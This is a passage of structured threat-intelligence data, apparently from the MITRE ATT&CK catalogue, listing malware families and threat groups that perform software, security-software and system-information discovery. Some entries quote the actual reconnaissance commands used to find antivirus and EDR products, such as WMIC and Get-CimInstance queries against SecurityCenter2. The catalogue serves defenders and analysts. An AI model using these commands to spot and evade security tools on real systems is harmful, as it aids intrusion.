{"id": "S1099", "name": "Samurai", "description": "Samurai can check for the presence and version of the .NET framework."}, {"id": "S0445", "name": "ShimRatReporter", "description": "ShimRatReporter gathered a list of installed software on the infected host."}, {"id": "G1008", "name": "SideCopy", "description": "SideCopy has collected browser information from a compromised host."}, {"id": "G0121", "name": "Sidewinder", "description": "Sidewinder has used tools to enumerate software installed on an infected host."}, {"id": "S0623", "name": "Siloscape", "description": "Siloscape searches for the kubectl binary."}, {"id": "S1124", "name": "SocGholish", "description": "SocGholish can identify the victim's browser in order to serve the correct fake update page."}, {"id": "S0646", "name": "SpicyOmelette", "description": "SpicyOmelette can enumerate running software on a targeted system."}, {"id": "S1042", "name": "SUGARDUMP", "description": "SUGARDUMP can identify Chrome, Opera, Edge Chromium, and Firefox browsers, including version number, on a compromised host."}, {"id": "S1064", "name": "SVCReady", "description": "SVCReady can collect a list of installed software from an infected host."}, {"id": "S0467", "name": "TajMahal", "description": "TajMahal has the ability to identify the Internet Explorer (IE) version on an infected host."}, {"id": "G0081", "name": "Tropic Trooper", "description": "Tropic Trooper's backdoor could list the infected system's installed software."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has queried the Registry on compromised systems for information on installed software."}, {"id": "G0124", "name": "Windigo", "description": "Windigo has used a script to detect installed software on targeted systems."}, {"id": "G0112", "name": "Windshift", "description": "Windshift has used malware to identify installed software."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has utilized the PowerShell script Get-DataInfo.ps1 to collect installed backup software information from a compromised machine."}, {"id": "S1065", "name": "Woody RAT", "description": "Woody RAT can collect .NET, PowerShell, and Python information from an infected host."}, {"id": "S0658", "name": "XCSSET", "description": "XCSSET uses ps aux with the grep command to enumerate common browsers and system processes potentially impacting XCSSET's exfiltration capabilities."}], "sub_techniques": [{"name": "Security Software Discovery", "description": "Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as cloud monitoring agents and anti-virus. Adversaries may use the information from Security Software Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.", "detailed_description": "Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as cloud monitoring agents and anti-virus. Adversaries may use the information from Security Software Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nExample commands that can be used to obtain security software information are netsh, reg query with Reg, dir with cmd, and Tasklist, but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.\nAdversaries may also utilize the Cloud API to discover cloud-native security software installed on compute infrastructure, such as the AWS CloudWatch agent, Azure VM Agent, and Google Cloud Monitor agent. These agents  may collect  metrics and logs from the VM, which may be centrally aggregated in a cloud-based monitoring platform.", "id": "T1518.001", "examples": [{"id": "S0469", "name": "ABK", "description": "ABK has the ability to identify the installed anti-virus product on the compromised host."}, {"id": "S1028", "name": "Action RAT", "description": "Action RAT can identify AV products on an infected host using the following command: cmd.exe WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List."}, {"id": "S1025", "name": "Amadey", "description": "Amadey has checked for a variety of antivirus products."}, {"id": "G0082", "name": "APT38", "description": "APT38 has identified security software, configurations, defensive tools, and sensors installed on a compromised system."}, {"id": "G0143", "name": "Aquatic Panda", "description": "Aquatic Panda has attempted to discover third party endpoint detection and response (EDR) tools on compromised systems."}, {"id": "S0373", "name": "Astaroth", "description": "Astaroth checks for the presence of Avast antivirus in the C:\\Program\\Files\\ folder. "}, {"id": "S1029", "name": "AuTo Stealer", "description": "AuTo Stealer has the ability to collect information about installed AV products from an infected host."}, {"id": "S0473", "name": "Avenger", "description": "Avenger has the ability to identify installed anti-virus products on a compromised host."}, {"id": "S0337", "name": "BadPatch", "description": "BadPatch uses WMI to enumerate installed security products in the victim\u2019s environment."}, {"id": "S0534", "name": "Bazar", "description": "Bazar can identify the installed antivirus engine."}, {"id": "S0657", "name": "BLUELIGHT", "description": "BLUELIGHT can collect a list of anti-virus products installed on a machine."}, {"id": "S1063", "name": "Brute Ratel C4", "description": "Brute Ratel C4 can detect EDR userland hooks."}, {"id": "S0471", "name": "build_downer", "description": "build_downer has the ability to detect if the infected host is running an anti-virus process."}, {"id": "S1039", "name": "Bumblebee", "description": "Bumblebee can identify specific analytical tools based on running processes."}, {"id": "S0484", "name": "Carberp", "description": "Carberp has queried the infected system's registry searching for specific registry keys associated with antivirus products."}, {"id": "S1149", "name": "CHIMNEYSWEEP", "description": "CHIMNEYSWEEP is capable of checking whether a compromised device is running DeepFreeze by Faronics."}, {"id": "S0023", "name": "CHOPSTICK", "description": "CHOPSTICK checks for antivirus and forensics software."}, {"id": "S0611", "name": "Clop", "description": "Clop can search for processes with antivirus and antimalware product names."}, {"id": "G0080", "name": "Cobalt Group", "description": "Cobalt Group used a JavaScript backdoor that is capable of collecting a list of the security solutions installed on the victim's machine."}, {"id": "S0244", "name": "Comnie", "description": "Comnie attempts to detect several anti-virus products."}, {"id": "S0492", "name": "CookieMiner", "description": "CookieMiner has checked for the presence of \"Little Snitch\", macOS network monitoring and application firewall software, stopping and exiting if it is found."}, {"id": "S0046", "name": "CozyCar", "description": "The main CozyCar dropper checks whether the victim has an anti-virus product installed. If the installed product is on a predetermined list, the dropper will exit."}, {"id": "S0115", "name": "Crimson", "description": "Crimson contains a command to collect information about anti-virus software on the victim."}, {"id": "S1111", "name": "DarkGate", "description": "DarkGate looks for various security products by process name using hard-coded values in the malware. DarkGate will not execute its keylogging thread if a process name associated with Trend Micro anti-virus is identified, or if runtime checks identify the presence of Kaspersky anti-virus. DarkGate will initiate a new thread if certain security products are identified on the victim, and recreate any malicious files associated with it if it determines they were removed by security software in a new system location."}, {"id": "G0012", "name": "Darkhotel", "description": "Darkhotel has searched for anti-malware strings and anti-virus processes running on the system."}, {"id": "S1066", "name": "DarkTortilla", "description": "DarkTortilla can check for the Kaspersky Anti-Virus suite."}, {"id": "S0673", "name": "DarkWatchman", "description": "DarkWatchman can search for anti-virus products on the system."}, {"id": "S0472", "name": "down_new", "description": "down_new has the ability to detect anti-virus products and processes on a compromised host."}, {"id": "S1159", "name": "DUSTTRAP", "description": "DUSTTRAP can identify security software."}, {"id": "S0062", "name": "DustySky", "description": "DustySky checks for the existence of anti-virus."}, {"id": "S0363", "name": "Empire", "description": "Empire can enumerate antivirus software on the target."}, {"id": "S0091", "name": "Epic", "description": "Epic searches for anti-malware services running on the victim\u2019s machine and terminates itself if it finds them."}, {"id": "S0396", "name": "EvilBunny", "description": "EvilBunny has been observed querying installed antivirus software."}, {"id": "S0568", "name": "EVILNUM", "description": "EVILNUM can search for anti-virus products on the system."}, {"id": "S0171", "name": "Felismus", "description": "Felismus checks for processes associated with anti-virus vendors."}, {"id": "S0267", "name": "FELIXROOT", "description": "FELIXROOT checks for installed security software like antivirus and firewall."}, {"id": "S0679", "name": "Ferocious", "description": "Ferocious has checked for AV software as part of its persistence process."}, {"id": "G0061", "name": "FIN8", "description": "FIN8 has used Registry keys to detect and avoid executing in potential sandboxes."}, {"id": "S0182", "name": "FinFisher", "description": "FinFisher probes the system to check for antimalware processes."}, {"id": "S0143", "name": "Flame", "description": "Flame identifies security software such as antivirus through the Security module."}, {"id": "S0381", "name": "FlawedAmmyy", "description": "FlawedAmmyy will attempt to detect anti-virus products during the initial infection."}, {"id": "C0001", "name": "Frankenstein", "description": "During Frankenstein, the threat actors used WMI queries to determine if analysis tools were running on a compromised system."}, {"id": "S1044", "name": "FunnyDream", "description": "FunnyDream can identify the processes for Bkav antivirus."}, {"id": "S0666", "name": "Gelsemium", "description": "Gelsemium can check for the presence of specific security products."}, {"id": "S0249", "name": "Gold Dragon", "description": "Gold Dragon checks for anti-malware products and processes."}, {"id": "S0531", "name": "Grandoreiro", "description": "Grandoreiro can list installed security products including the Trusteer and Diebold Warsaw GAS Tecnologia online banking protections."}, {"id": "S0483", "name": "IcedID", "description": "IcedID can identify AV products on an infected host using the following command:WMIC.exe WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get * /Format:List."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole can check for the presence of network sniffers, AV, and BitDefender firewall."}, {"id": "S0201", "name": "JPIN", "description": "JPIN checks for the presence of certain security-related processes and deletes its installer/uninstaller component if it identifies any of them."}, {"id": "S0283", "name": "jRAT", "description": "jRAT can list security software, such as by using WMIC to identify anti-virus products installed on the victim\u2019s machine and to obtain firewall details."}, {"id": "S0088", "name": "Kasidet", "description": "Kasidet has the ability to identify any anti-virus installed on the infected system."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has checked for the presence of antivirus software with powershell Get-CimInstance -Namespace root/securityCenter2 \u2013 classname antivirusproduct."}, {"id": "C0035", "name": "KV Botnet Activity", "description": "KV Botnet Activity involved removal of security tools, as well as other identified IOT malware, from compromised devices."}, {"id": "S1160", "name": "Latrodectus", "description": "Latrodectus has the ability to identify installed antivirus products."}, {"id": "S0513", "name": "LiteDuke", "description": "LiteDuke has the ability to check for the presence of Kaspersky security software."}, {"id": "S0680", "name": "LitePower", "description": "LitePower can identify installed AV software."}, {"id": "S0681", "name": "Lizar", "description": "Lizar can search for processes associated with an anti-virus product from list."}, {"id": "S1141", "name": "LunarWeb", "description": "LunarWeb has run shell commands to obtain a list of installed security products."}, {"id": "S1060", "name": "Mafalda", "description": "Mafalda can search for a variety of security software programs, EDR systems, and malware analysis tools."}, {"id": "G1026", "name": "Malteiro", "description": "Malteiro collects the installed antivirus on the victim machine."}, {"id": "S0652", "name": "MarkiRAT", "description": "MarkiRAT can check for running processes on the victim\u2019s machine to look for Kaspersky and Bitdefender antivirus products."}, {"id": "S0455", "name": "Metamorfo", "description": "Metamorfo collects a list of installed antivirus software from the victim\u2019s system."}, {"id": "S0688", "name": "Meteor", "description": "Meteor has the ability to search for Kaspersky Antivirus on a victim's machine."}, {"id": "S0339", "name": "Micropsia", "description": "Micropsia searches for anti-virus software and firewall products installed on the victim\u2019s machine using WMI."}, {"id": "S1122", "name": "Mispadu", "description": "Mispadu can list installed security products in the victim\u2019s environment."}, {"id": "S0553", "name": "MoleNet", "description": "MoleNet can use WMI commands to check the system for firewall and antivirus software."}, {"id": "S0284", "name": "More_eggs", "description": "More_eggs can obtain information on installed anti-malware programs."}, {"id": "S0256", "name": "Mosquito", "description": "Mosquito's installer searches the Registry and system to see if specific antivirus tools are installed on the system."}, {"id": "G0069", "name": "MuddyWater", "description": "MuddyWater has used malware to check running processes against a hard-coded list of security tools often used by malware researchers."}, {"id": "G0019", "name": "Naikon", "description": "Naikon uses commands such as netsh advfirewall firewall to discover local firewall settings."}, {"id": "S0108", "name": "netsh", "description": "netsh can be used to discover system firewall settings."}, {"id": "S0457", "name": "Netwalker", "description": "Netwalker can detect and terminate active security software-related processes on infected systems."}, {"id": "S0368", "name": "NotPetya", "description": "NotPetya determines if specific antivirus programs are running on an infected host machine."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, threat actors used scripts to detect security software."}, {"id": "S1091", "name": "Pacu", "description": "Pacu can enumerate AWS security services, including WAF rules and GuardDuty detectors."}, {"id": "G0040", "name": "Patchwork", "description": "Patchwork scanned the \"Program Files\" directories for a directory with the string \"Total Security\" (the installation path of the \"360 Total Security\" antivirus tool)."}, {"id": "S0501", "name": "PipeMon", "description": "PipeMon can check for the presence of ESET and Kaspersky security software."}, {"id": "G1040", "name": "Play", "description": "Play has used the information-stealing tool Grixba to scan for anti-virus software."}, {"id": "S0223", "name": "POWERSTATS", "description": "POWERSTATS has detected security tools."}, {"id": "S0184", "name": "POWRUNER", "description": "POWRUNER may collect information on the victim's anti-virus software."}, {"id": "S0113", "name": "Prikormka", "description": "A module in Prikormka collects information from the victim about installed anti-virus software."}, {"id": "S0196", "name": "PUNCHBUGGY", "description": "PUNCHBUGGY can gather AVs registered in the system."}, {"id": "S0650", "name": "QakBot", "description": "QakBot can identify the installed antivirus product on a targeted system."}, {"id": "S1130", "name": "Raspberry Robin", "description": "Raspberry Robin attempts to identify security software running on the victim machine, such as BitDefender, Avast, and Kaspersky."}, {"id": "S0125", "name": "Remsec", "description": "Remsec has a plugin detect security products via active drivers."}, {"id": "G0106", "name": "Rocke", "description": "Rocke used scripts which detected and uninstalled antivirus software."}, {"id": "S0270", "name": "RogueRobin", "description": "RogueRobin enumerates running processes to search for Wireshark and Windows Sysinternals suite."}, {"id": "S0148", "name": "RTM", "description": "RTM can obtain information about security software on the victim."}, {"id": "G1008", "name": "SideCopy", "description": "SideCopy uses a loader DLL file to collect AV product names from an infected host."}, {"id": "G0121", "name": "Sidewinder", "description": "Sidewinder has used the Windows service winmgmts:\\.\\root\\SecurityCenter2 to check installed antivirus products."}, {"id": "S0692", "name": "SILENTTRINITY", "description": "SILENTTRINITY can determine if an anti-virus product is installed through the resolution of the service's virtual SID."}, {"id": "S0468", "name": "Skidmap", "description": "Skidmap has the ability to check if /usr/sbin/setenforce exists. This file controls what mode SELinux is in."}, {"id": "S0646", "name": "SpicyOmelette", "description": "SpicyOmelette can check for the presence of 29 different antivirus tools."}, {"id": "S0380", "name": "StoneDrill", "description": "StoneDrill can check for antivirus and antimalware programs."}, {"id": "S0142", "name": "StreamEx", "description": "StreamEx has the ability to scan for security tools such as firewalls and antivirus tools."}, {"id": "S0491", "name": "StrongPity", "description": "StrongPity can identify if ESET or BitDefender antivirus are installed before dropping its payload."}, {"id": "S0603", "name": "Stuxnet", "description": "Stuxnet enumerates the currently running processes related to a variety of security products."}, {"id": "S0559", "name": "SUNBURST", "description": "SUNBURST checked for a variety of antivirus/endpoint detection agents prior to execution."}, {"id": "S0098", "name": "T9000", "description": "T9000 performs checks for various antivirus and security products during installation."}, {"id": "G1018", "name": "TA2541", "description": "TA2541 has used tools to search victim systems for security products such as antivirus and firewall software."}, {"id": "S0467", "name": "TajMahal", "description": "TajMahal has the ability to identify which anti-virus products, firewalls, and anti-spyware products are in use."}, {"id": "S0057", "name": "Tasklist", "description": "Tasklist can be used to enumerate security software currently running on a system by process name of known products."}, {"id": "G0139", "name": "TeamTNT", "description": "TeamTNT has searched for security products on infected machines."}, {"id": "G0089", "name": "The White Company", "description": "The White Company has checked for specific antivirus products on the target\u2019s computer, including Kaspersky, Quick Heal, AVG, BitDefender, Avira, Sophos, Avast!, and ESET."}, {"id": "S0595", "name": "ThiefQuest", "description": "ThiefQuest uses the kill_unwanted function to get a list of running processes, compares each process with an encrypted list of \"unwanted\" security related programs, and kills the processes for security related programs."}, {"id": "G1022", "name": "ToddyCat", "description": "ToddyCat can determine is Kaspersky software is running on an endpoint by running cmd /c wmic process where name=\"avp.exe\"."}, {"id": "G0081", "name": "Tropic Trooper", "description": "Tropic Trooper can search for anti-virus software running on the system."}, {"id": "G0010", "name": "Turla", "description": "Turla has obtained information on security software, including security logging information that may indicate whether their malware has been detected."}, {"id": "S0476", "name": "Valak", "description": "Valak can determine if a compromised host has security products installed."}, {"id": "S0257", "name": "VERMIN", "description": "VERMIN uses WMI to check for anti-virus software installed on the system."}, {"id": "S0579", "name": "Waterbear", "description": "Waterbear can find the presence of a specific security software."}, {"id": "S0689", "name": "WhisperGate", "description": "WhisperGate can recognize the presence of monitoring tools on a target system."}, {"id": "G0112", "name": "Windshift", "description": "Windshift has used malware to identify installed AV and commonly used forensic and malware analysis tools."}, {"id": "S0176", "name": "Wingbird", "description": "Wingbird checks for the presence of Bitdefender security software."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has used WMI to identify anti-virus products installed on a victim's machine."}, {"id": "S1065", "name": "Woody RAT", "description": "Woody RAT can detect Avast Software, Doctor Web, Kaspersky, AVG, ESET, and Sophos antivirus programs."}, {"id": "S0653", "name": "xCaon", "description": "xCaon has checked for the existence of Kaspersky antivirus software on the system."}, {"id": "S0658", "name": "XCSSET", "description": "XCSSET searches firewall configuration files located in /Library/Preferences/ and uses csrutil status to determine if System Integrity Protection is enabled."}, {"id": "S0388", "name": "YAHOYAH", "description": "YAHOYAH checks for antimalware solution processes on the system."}, {"id": "S0330", "name": "Zeus Panda", "description": "Zeus Panda checks to see if anti-virus, anti-spyware, or firewall products are installed in the victim\u2019s environment."}, {"id": "S1013", "name": "ZxxZ", "description": "ZxxZ can search a compromised host to determine if it is running Windows Defender or Kasperky antivirus."}]}]}, {"name": "System Information Discovery", "description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.", "detailed_description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the systemsetup configuration tool on macOS. As an example, adversaries with user-level access can execute the df -aH command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. show version). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.", "id": "T1082", "examples": [{"id": "S0065", "name": "4H RAT", "description": "4H RAT sends an OS version identifier in its beacons."}, {"id": "S1028", "name": "Action RAT", "description": "Action RAT has the ability to collect the hostname, OS version, and OS architecture of an infected host."}, {"id": "G0018", "name": "admin@338", "description": "admin@338 actors used the following commands after exploiting a machine with LOWBALL malware to obtain information about the OS: ver >> %temp%\\download systeminfo >> %temp%\\download"}, {"id": "S0045", "name": "ADVSTORESHELL", "description": "ADVSTORESHELL can run Systeminfo to gather information about the victim."}, {"id": "S0331", "name": "Agent Tesla", "description": "Agent Tesla can collect the system's computer name and also has the capability to collect information on the processor, memory, OS, and video card from the system."}, {"id": "S1129", "name": "Akira", "description": "Akira uses the GetSystemInfo Windows function to determine the number of processors on a victim machine."}, {"id": "S1025", "name": "Amadey", "description": "Amadey has collected the computer name and OS version from a compromised machine."}, {"id": "S0504", "name": "Anchor", "description": "Anchor can determine the hostname and linux version on a compromised host."}, {"id": "S0584", "name": "AppleJeus", "description": "AppleJeus has collected the victim host information after infection."}, {"id": "S0622", "name": "AppleSeed", "description": "AppleSeed can identify the OS version of a targeted system."}, {"id": "G0026", "name": "APT18", "description": "APT18 can collect system information from the victim\u2019s machine."}, {"id": "G0073", "name": "APT19", "description": "APT19 collected system architecture information. APT19 used an HTTP malware variant and a Port 22 malware variant to gather the hostname and CPU information from the victim\u2019s machine."}, {"id": "G0022", "name": "APT3", "description": "APT3 has a tool that can obtain information about the local system."}, {"id": "G0050", "name": "APT32", "description": "APT32 has collected the OS version and computer name from victims. One of the group's backdoors can also query the Windows Registry to gather system information, and another macOS backdoor performs a fingerprint of the machine on its first connection to the C&C server. APT32 executed shellcode to identify the name of the infected host."}, {"id": "G0067", "name": "APT37", "description": "APT37 collects the computer name, the BIOS model, and execution path."}, {"id": "G0082", "name": "APT38", "description": "APT38 has attempted to get detailed information about a compromised host, including the operating system, version, patches, hotfixes, and service packs."}, {"id": "G0096", "name": "APT41", "description": "APT41 uses multiple built-in commands such as systeminfo and net config Workstation to enumerate victim system basic configuration information."}, {"id": "G0143", "name": "Aquatic Panda", "description": "Aquatic Panda has used native OS commands to understand privilege levels and system details."}, {"id": "S0456", "name": "Aria-body", "description": "Aria-body has the ability to identify the hostname, computer name, Windows version, processor speed, machine GUID, and disk information on a compromised host."}, {"id": "S0373", "name": "Astaroth", "description": "Astaroth collects the machine name and keyboard language from the system. "}, {"id": "S1087", "name": "AsyncRAT", "description": "AsyncRAT can check the disk size through the values obtained with DeviceInfo."}, {"id": "S0438", "name": "Attor", "description": "Attor monitors the free disk space on the system."}, {"id": "S1029", "name": "AuTo Stealer", "description": "AuTo Stealer has the ability to collect the hostname and OS information from an infected host."}, {"id": "S0473", "name": "Avenger", "description": "Avenger has the ability to identify the host volume ID and the OS architecture on a compromised host."}, {"id": "S0344", "name": "Azorult", "description": "Azorult can collect the machine information, system architecture, the OS version, computer name, Windows product name, the number of CPU cores, video card information, and the system language."}, {"id": "S0638", "name": "Babuk", "description": "Babuk can enumerate disk volumes, get disk information, and query service status."}, {"id": "S0414", "name": "BabyShark", "description": "BabyShark has executed the ver command."}, {"id": "S0475", "name": "BackConfig", "description": "BackConfig has the ability to gather the victim's computer name."}, {"id": "S0093", "name": "Backdoor.Oldrea", "description": "Backdoor.Oldrea collects information about the OS and computer name."}, {"id": "S0031", "name": "BACKSPACE", "description": "During its initial execution, BACKSPACE extracts operating system information from the infected host."}, {"id": "S0245", "name": "BADCALL", "description": "BADCALL collects the computer name and host name on the compromised system."}, {"id": "S0642", "name": "BADFLICK", "description": "BADFLICK has captured victim computer name, memory space, and CPU details."}, {"id": "S1081", "name": "BADHATCH", "description": "BADHATCH can obtain current system information from a compromised machine such as the SHELL PID, PSVERSION, HOSTNAME, LOGONSERVER, LASTBOOTUP, drive information, OS type/version, bitness, and hostname."}, {"id": "S0337", "name": "BadPatch", "description": "BadPatch collects the OS system, OS version, MAC address, and the computer name from the victim\u2019s machine."}, {"id": "S0234", "name": "Bandook", "description": "Bandook can collect information about the drives available on the system."}, {"id": "S0239", "name": "Bankshot", "description": "Bankshot gathers system information, network addresses, disk type, disk free space, and the operation system version."}, {"id": "S0534", "name": "Bazar", "description": "Bazar can fingerprint architecture, computer name, and OS version on the compromised host. Bazar can also check if the Russian language is installed on the infected machine and terminate if it is found."}, {"id": "S0017", "name": "BISCUIT", "description": "BISCUIT has a command to collect the processor type, operation system, computer name, and whether the system is a laptop or PC."}, {"id": "S0268", "name": "Bisonal", "description": "Bisonal has used commands and API calls to gather system information."}, {"id": "S1070", "name": "Black Basta", "description": "Black Basta can enumerate volumes and collect system boot configuration and CPU information."}, {"id": "S1068", "name": "BlackCat", "description": "BlackCat can obtain the computer name and UUID, and enumerate local drives."}, {"id": "S0089", "name": "BlackEnergy", "description": "BlackEnergy has used Systeminfo to gather the OS version, as well as information on the system configuration, BIOS, the motherboard, and the processor."}, {"id": "S0564", "name": "BlackMould", "description": "BlackMould can enumerate local drives on a compromised host."}, {"id": "S0520", "name": "BLINDINGCAN", "description": "BLINDINGCAN has collected from a victim machine the system name, processor information, OS version, and disk information, including type and free space available."}, {"id": "G0108", "name": "Blue Mockingbird", "description": "Blue Mockingbird has collected hardware details for the victim's system, including CPU and memory information."}, {"id": "S0657", "name": "BLUELIGHT", "description": "BLUELIGHT has collected the computer name and OS version from victim machines."}, {"id": "S0486", "name": "Bonadan", "description": "Bonadan has discovered the OS version, CPU model, and RAM size of the system it has been installed on."}, {"id": "S0635", "name": "BoomBox", "description": "BoomBox can enumerate the hostname, domain, and IP of a compromised host."}, {"id": "S0252", "name": "Brave Prince", "description": "Brave Prince collects hard drive content and system configuration information."}, {"id": "S0043", "name": "BUBBLEWRAP", "description": "BUBBLEWRAP collects system information, including the operating system version and hostname."}, {"id": "S0471", "name": "build_downer", "description": "build_downer has the ability to send system volume information to C2."}, {"id": "S1039", "name": "Bumblebee", "description": "Bumblebee can enumerate the OS version and domain on a targeted system."}, {"id": "S0482", "name": "Bundlore", "description": "Bundlore will enumerate the macOS version to determine which follow-on behaviors to execute using /usr/bin/sw_vers -productVersion."}, {"id": "C0017", "name": "C0017", "description": "During C0017, APT41 issued ping -n 1 ((cmd /c dir c:\\|findstr Number).split()[-1]+ commands to find the volume serial number of compromised systems."}, {"id": "S0693", "name": "CaddyWiper", "description": "CaddyWiper can use DsRoleGetPrimaryDomainInformation to determine the role of the infected machine. CaddyWiper can also halt execution if the compromised host is identified as a domain controller."}, {"id": "S0454", "name": "Cadelspy", "description": "Cadelspy has the ability to discover information about the compromised host."}, {"id": "S0351", "name": "Cannon", "description": "Cannon can gather system information from the victim\u2019s machine such as the OS version, machine name, and drive information."}, {"id": "S0484", "name": "Carberp", "description": "Carberp has collected the operating system version from the infected system."}, {"id": "S0348", "name": "Cardinal RAT", "description": "Cardinal RAT can collect the hostname, Microsoft Windows version, and processor architecture from a victim machine."}, {"id": "S0462", "name": "CARROTBAT", "description": "CARROTBAT has the ability to determine the operating system of the compromised host and whether Windows is being run with x86 or x64 architecture."}, {"id": "S0572", "name": "Caterpillar WebShell", "description": "Caterpillar WebShell has a module to gather information from the compromrised asset, including the computer version, computer name, IIS version, and more."}, {"id": "S0631", "name": "Chaes", "description": "Chaes has collected system information, including the machine name and OS version."}, {"id": "S0674", "name": "CharmPower", "description": "CharmPower can enumerate the OS version and computer name on a targeted system."}, {"id": "S0144", "name": "ChChes", "description": "ChChes collects the victim hostname, window resolution, and Microsoft Windows version."}, {"id": "G0114", "name": "Chimera", "description": "Chimera has used fsutil fsinfo drives, systeminfo, and vssadmin list shadows for system information including shadow volumes and drive information."}, {"id": "S0667", "name": "Chrommme", "description": "Chrommme has the ability to list drives and obtain the computer name of a compromised host."}, {"id": "S0660", "name": "Clambling", "description": "Clambling can discover the hostname, computer name, and Windows version of a targeted machine."}, {"id": "S0106", "name": "cmd", "description": "cmd can be used to find information about the operating system."}, {"id": "S0244", "name": "Comnie", "description": "Comnie collects the hostname of the victim machine."}, {"id": "G0142", "name": "Confucius", "description": "Confucius has used a file stealer that can examine system drives, including those other than the C drive."}, {"id": "S0137", "name": "CORESHELL", "description": "CORESHELL collects hostname, volume serial number and OS version data from the victim and sends the information to its C2 server."}, {"id": "S1155", "name": "Covenant", "description": "Covenant implants can gather basic information on infected systems."}, {"id": "S0046", "name": "CozyCar", "description": "A system info module in CozyCar gathers information on the victim host\u2019s configuration."}, {"id": "S0488", "name": "CrackMapExec", "description": "CrackMapExec can enumerate the system drives and associated system name."}, {"id": "S0115", "name": "Crimson", "description": "Crimson contains a command to collect the victim PC name, disk drive information, and operating system."}, {"id": "S0625", "name": "Cuba", "description": "Cuba can enumerate local drives, disk type, and disk free space."}, {"id": "S1153", "name": "Cuckoo Stealer", "description": "Cuckoo Stealer can gather information about the OS version and hardware on compromised hosts."}, {"id": "G1012", "name": "CURIUM", "description": "CURIUM deploys information gathering tools focused on capturing IP configuration, running application, system information, and network connectivity information."}, {"id": "C0029", "name": "Cutting Edge", "description": "During Cutting Edge, threat actors used the ENUM4LINUX Perl script for discovery on Windows and Samba hosts."}, {"id": "S0687", "name": "Cyclops Blink", "description": "Cyclops Blink has the ability to query device information."}, {"id": "G1034", "name": "Daggerfly", "description": "Daggerfly utilizes victim machine operating system information to create custom User Agent strings for subsequent command and control communication."}, {"id": "S0334", "name": "DarkComet", "description": "DarkComet can collect the computer name, RAM used, and operating system version from the victim\u2019s machine."}, {"id": "S1111", "name": "DarkGate", "description": "DarkGate uses the Delphi methods Sysutils::DiskSize and GlobalMemoryStatusEx to collect disk size and physical memory as part of the malware's anti-analysis checks for running in a virtualized environment. DarkGate will gather various system information such as display adapter description, operating system type and version, processor type, and RAM amount."}, {"id": "G0012", "name": "Darkhotel", "description": "Darkhotel has collected the hostname, OS version, service pack version, and the processor architecture from the victim\u2019s machine."}, {"id": "S1066", "name": "DarkTortilla", "description": "DarkTortilla can obtain system information by querying the Win32_ComputerSystem, Win32_BIOS, Win32_MotherboardDevice, Win32_PnPEntity, and Win32_DiskDrive WMI objects."}, {"id": "S0673", "name": "DarkWatchman", "description": "DarkWatchman can collect the OS version, system architecture, and computer name."}, {"id": "S1052", "name": "DEADEYE", "description": "DEADEYE can enumerate a victim computer's volume serial number and host name."}, {"id": "S0616", "name": "DEATHRANSOM", "description": "DEATHRANSOM can enumerate logical drives on a target system."}, {"id": "S0354", "name": "Denis", "description": "Denis collects OS information and the computer name from the victim\u2019s machine."}, {"id": "S0021", "name": "Derusbi", "description": "Derusbi gathers the name of the local host, version of GNU Compiler Collection (GCC), and the system information about the CPU, machine, and operating system."}, {"id": "S0659", "name": "Diavol", "description": "Diavol can collect the computer name and OS version from the system."}, {"id": "S0472", "name": "down_new", "description": "down_new has the ability to identify the system volume information of a compromised host."}, {"id": "S0186", "name": "DownPaper", "description": "DownPaper collects the victim host name and serial number, and then sends the information to the C2 server."}, {"id": "S0384", "name": "Dridex", "description": "Dridex has collected the computer name and OS architecture information from the system."}, {"id": "S0547", "name": "DropBook", "description": "DropBook has checked for the presence of Arabic language in the infected machine's settings."}, {"id": "S0105", "name": "dsquery", "description": "dsquery has the ability to enumerate various information, such as the operating system and host name, for systems within a domain."}, {"id": "S0567", "name": "Dtrack", "description": "Dtrack can collect the victim's computer name, hostname and adapter information to create a unique identifier."}, {"id": "S1159", "name": "DUSTTRAP", "description": "DUSTTRAP reads the value of the infected system's HKLM\\SYSTEM\\Microsoft\\Cryptography\\MachineGUID value."}, {"id": "S0062", "name": "DustySky", "description": "DustySky extracts basic information about the operating system."}, {"id": "S0024", "name": "Dyre", "description": "Dyre has the ability to identify the computer name, OS version, and hardware configuration on a compromised host."}, {"id": "S0554", "name": "Egregor", "description": "Egregor can perform a language check of the infected system and can query the CPU information (cupid)."}, {"id": "S0081", "name": "Elise", "description": "Elise executes systeminfo after initial communication is made to the remote server."}, {"id": "S0082", "name": "Emissary", "description": "Emissary has the capability to execute ver and systeminfo commands."}, {"id": "S0363", "name": "Empire", "description": "Empire can enumerate host system information like OS, architecture, domain name, applied patches, and more."}, {"id": "S0634", "name": "EnvyScout", "description": "EnvyScout can determine whether the ISO payload was received by a Windows or iOS device."}, {"id": "S0091", "name": "Epic", "description": "Epic collects the 